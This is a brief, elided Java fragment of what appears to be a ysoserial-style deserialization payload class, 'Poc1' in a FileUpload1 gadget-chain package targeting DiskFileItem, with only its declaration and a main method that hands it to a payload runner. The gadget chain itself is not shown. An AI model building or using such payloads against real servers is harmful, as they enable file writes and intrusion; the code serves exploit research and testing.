package ysoserial.payloads.tabbyGadgetChains.FileUpload1;
import java.io.File;
...
public class Poc1 implements ReleaseableObjectPayload<DiskFileItem> {
    ...
    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(ysoserial.payloads.tabbyGadgetChains.FileUpload1.Poc1.class, args);
    }
